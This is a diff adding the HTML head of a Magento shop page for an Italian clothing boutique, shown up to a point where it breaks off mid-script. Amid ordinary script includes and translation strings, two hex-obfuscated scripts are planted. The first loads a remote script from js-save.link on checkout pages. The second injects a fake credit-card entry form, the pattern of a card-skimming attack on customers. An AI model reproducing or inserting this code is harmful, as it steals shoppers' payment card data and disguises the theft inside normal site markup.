@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="it" lang="it">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Valeria Shop</title>
+<!--<meta name="description" content="Default Description" />-->
+<meta name="description" content="Acquista Online da Valeria Boutique Brescia. Abbigliamento, maglie, scarpe, accessori, vintage, camicie e Francesca Tanghetti" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<meta name="viewport" content="width=1000, initial-scale=0.7, user-scalable=yes"/>
+<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+
+
+<link rel="stylesheet" type="text/css" href="http://www.myvaleriashop.com/js/calendar/calendar-win2k-1.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/css/bootstrap.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/css/font-awesome.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/css/app-purple.css" media="all" />
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/varien/product.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/calendar/calendar.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/js/calendar/calendar-setup.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/bundle.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/jquery-2.1.1.min.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/jquery-noconflict.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/pt/ajax/js/ajax.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/pt/carousel/js/jquery.countdown.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/pt/tabs/js/easyResponsiveTabs.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/cloud-zoom.1.0.3.min.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/jquery.fancybox.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/fancybox-buttons.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/owl.carousel.min.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/imagesloaded.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/jquery.jqtransform.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/jquery.cookie.min.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/js/app.js"></script>
+<script type="text/javascript" src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/pt/slider/js/jssor.slider.min.js"></script>
+<link rel="stylesheet" type="text/css" href="/skin/frontend/pt_voke/default/css/style.css" media="all" />
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.myvaleriashop.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["AF","AL","DZ","AD","AO","AI","AQ","AG","AN","SA","AR","AM","AW","AU","AT","AZ","BS","BH","BD","BB","BE","BZ","BJ","BM","BT","BY","BO","BA","BW","BR","BN","BG","BF","BI","KH","CM","CA","CV","TD","CL","CN","CY","VA","CO","KM","CG","CD","KP","KR","CI","CR","HR","CU","DK","DM","EC","EG","SV","AE","ER","EE","ET","RU","FJ","PH","FI","FR","GA","GM","GE","GS","DE","GH","JM","JP","GI","DJ","JO","GR","GD","GL","GP","GU","GT","GG","GF","GN","GW","GQ","GY","HT","HN","IN","ID","IR","IQ","IE","IS","BV","CX","IM","NF","AX","KY","CC","CK","FK","FO","HM","MP","MH","UM","PN","SB","TC","VI","VG","IL","JE","KZ","KE","KG","KI","KW","LA","LS","LV","LB","LR","LY","LI","LT","LU","MG","MW","MV","MY","ML","MT","MA","MQ","MR","MU","YT","MX","FM","MD","MC","MN","ME","MS","MZ","MM","NA","NR","NP","NI","NE","NG","NU","NO","NC","NZ","OM","NL","PK","PW","PA","PG","PY","PE","PF","PL","PT","PR","QA","HK","MO","GB","CZ","CF","MK","DO","RE","RO","RW","EH","KN","LC","MF","PM","VC","WS","AS","BL","SM","SH","ST","SN","RS","SC","SL","SG","SY","SK","SI","SO","ES","LK","US","ZA","SD","SR","SJ","SE","CH","SZ","TJ","TH","TW","TZ","TF","IO","PS","TL","TG","TK","TO","TT","TN","TR","TM","TV","UA","UG","HU","UY","UZ","VU","VE","VN","WF","YE","ZM","ZW"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"HTML tags are not allowed":"I tag HTML non sono permessi","Please select an option.":"Selezionare una opzione.","This is a required field.":"Questo \u00e8 un campo obbligatorio.","Please enter a valid number in this field.":"Inserire un numero valido in questo campo.","The value is not within the specified range.":"Il valore non \u00e8 compreso nell\\'intervallo specificato.","Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.":"Utilizzare solo numeri in questo campo. Evitare spazi o altri caratteri come punti e virgole.","Please use letters only (a-z or A-Z) in this field.":"Utilizzare solo lettere in questo campo (a-z o A-Z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Utilizzare solo lettere (a-z), numeri (0-9) o underscore(_) in questo campo, la prima lettera deve essere una lettera.","Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"Utilizzare solo lettere (a-z o A-Z) o solo numeri (0-9) in questo campo. Non sono permessi spazi o altri caratteri.","Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.":"Utilizzare solo lettere (a-z or A-Z) o numeri (0-9) o spazi o solo # in questo campo.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Inserisci un numero di telefono valido. Per esempio (123) 456-7890 o 123-456-7890.","Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.":"Inserire un numero di fax valido. Per esempio (123) 456-7890 or 123-456-7890.","Please enter a valid date.":"Inserire una data valida.","The From Date value should be less than or equal to the To Date value.":"Il valore Dalla Data deve essere minore o uguale al valore della Data A.","Please enter a valid email address. For example johndoe@domain.com.":"Inserire un indirizzo email valido. Per esempio johndoe@domain.com.","Please use only visible characters and spaces.":"Utilizzare solo caratteri visibili e spazi.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Inserire 6 o pi\u00f9 caratteri. Gli spazi iniziali o finali saranno ignorati.","Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.":"Inserire 7 o pi\u00f9 caratteri. La password dovrebbe contenere sia caratteri numerici che alfabetici.","Please make sure your passwords match.":"Assicurati che le password corrispondano.","Please enter a valid URL. Protocol is required (http:\/\/, https:\/\/ or ftp:\/\/)":"Inserire un URL valido. Il protocollo \u00e8 obbligatorio (http:\/\/, https:\/\/ or ftp:\/\/)","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Inserire un URL valido. Per esempio http:\/\/www.example.com o www.example.com","Please enter a valid URL Key. For example \"example-page\", \"example-page.html\" or \"anotherlevel\/example-page\".":"Inserire un chiave URL valida. Per esempio \"example-page\", \"example-page.html\" o \"anotherlevel\/example-page\".","Please enter a valid XML-identifier. For example something_1, block5, id-4.":"Inserire un identificativo XML valido. Per esempio something_1, block5, id-4.","Please enter a valid social security number. For example 123-45-6789.":"Inserire un numero valido di previdenza sociale. Per esempio 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Inserire un codice zip valdio. Per esempio 90602 o 90602-1234.","Please enter a valid zip code.":"Inserire codice zip valido.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Utilizzare questo formato della data: dd\/mm\/yyyy. Per esempio 17\/03\/2006 per il 17 di Marzo, 2006.","Please enter a valid $ amount. For example $100.00.":"Inserire un importo valido di $. Per esempio $100.00.","Please select one of the above options.":"Selezionare una delle opzioni soprastanti.","Please select one of the options.":"Selezionare una delle opzioni.","Please select State\/Province.":"Selezionare Stato\/Provincia.","Please enter a number greater than 0 in this field.":"Insereire un numero maggiore di 0 in questo campo.","Please enter a number 0 or greater in this field.":"Inserire 0 o un numero supereiore in questo campo.","Please enter a valid credit card number.":"Inserire un numero di carta di credito valido.","Credit card number does not match credit card type.":"Il numero della carta di credito non corrisponde al tipo della carta.","Card type does not match credit card number.":"Il tipo di carda non corrisponde con il numero della carta di credito.","Incorrect credit card expiration date.":"Data scadenza carta di credito non corretta.","Please enter a valid credit card verification number.":"Inserire numero di verifica della carta di credito.","Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"In questo campo utilizzare solo lettere (a-z or A-Z), numeri (0-9) o underscore(_), il primo carattere deve essere una lettera.","Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.":"Inserire una lunghezza CSS valida. Per esempio 100px o 77pt or 20em o .5ex or 50%.","Text length does not satisfy specified text range.":"La lunghezza del testo non rispetta la lunghezza specificata.","Please enter a number lower than 100.":"Inserire un numero minore di 100.","Please select a file":"Seleziona un file","Please enter issue number or start date for switch\/solo card type.":"Si prega di inserrie il numero di rilascio o la data di inizio per switch\/solo tipo della carta.","Please wait, loading...":"Attendere prego, caricamento...","This date is a required value.":"Questa data \u00e8 un valore obbligatorio.","Please enter a valid day (1-%d).":"Inserisci un giorno valido (1-%d).","Please enter a valid month (1-12).":"Inserire mese (1-12).","Please enter a valid year (1900-%d).":"Inserire anno (1900-%d).","Please enter a valid full date":"Inserire una data completa valida","Please enter a valid date between %s and %s":"Inserire una data valida tra %s e %s","Please enter a valid date equal to or greater than %s":"Inserire una data valida uguale o maggiore di %s","Please enter a valid date less than or equal to %s":"Inserire una data valida inferiore o uguale a %s","Complete":"Completo","Add Products":"Aggiungi prodotti","Please choose to register or to checkout as a guest":"Scegliere se registrarsi o fare il checkout come ospite","Your order cannot be completed at this time as there is no shipping methods available for it. Please make necessary changes in your shipping address.":"Il tuo ordine non pu\u00f2 essere completato in questo momento perch\u00e9 non ci sono metodi di spedizioni disponibili per esso. Devi modificare il tuo indirizzo di spedizione .","Please specify payment method.":"Specificare un metodo di pagamento.","Your order cannot be completed at this time as there is no payment methods available for it.":"Il tuo ordine non pu\u00f2 essere completato in questo momento perch\u00e9 non ci sono metodi di pagamento disponibili per esso.","Add to Cart":"Aggiungi al carrello","In Stock":"Disponibile","Out of Stock":"Non disponibile"});
+        //]]></script><script>
+var _0x7539=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2E\x6C\x69\x6E\x6B\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2F\x6D\x61\x67\x65\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x7539[2]))[_0x7539[1]](window[_0x7539[0]])){document[_0x7539[4]](_0x7539[3])}
+</script><script>var _0xc240=["\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x68\x65\x63\x6B\x6F\x75\x74\x2D\x70\x61\x79\x6D\x65\x6E\x74\x2D\x6D\x65\x74\x68\x6F\x64\x2D\x6C\x6F\x61\x64","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64","\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64","\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x6C\x69\x73\x74\x22\x20\x69\x64\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B\x22\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6F\x77\x6E\x65\x72\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x74\x79\x70\x65\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x2D\x73\x65\x6C\x65\x63\x74\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x2D\x2D\x50\x6C\x65\x61\x73\x65\x20\x53\x65\x6C\x65\x63\x74\x2D\x2D\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x41\x45\x22\x3E\x41\x6D\x65\x72\x69\x63\x61\x6E\x20\x45\x78\x70\x72\x65\x73\x73\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x56\x49\x22\x3E\x56\x69\x73\x61\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4D\x43\x22\x3E\x4D\x61\x73\x74\x65\x72\x43\x61\x72\x64\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x44\x49\x22\x3E\x44\x69\x73\x63\x6F\x76\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4A\x43\x42\x22\x3E\x4A\x43\x42\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x53\x4D\x22\x3E\x53\x77\x69\x74\x63\x68\x2F\x4D\x61\x65\x73\x74\x72\x6F\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x6E\x75\x6D\x62\x65\x72\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x45\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x20\x44\x61\x74\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x6E\x74\x68\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x65\x78\x70\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x79\x65\x61\x72\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x37\x22\x3E\x32\x30\x31\x37\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x38\x22\x3E\x32\x30\x31\x38\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x39\x22\x3E\x32\x30\x31\x39\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x30\x22\x3E\x32\x30\x32\x30\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x31\x22\x3E\x32\x30\x32\x31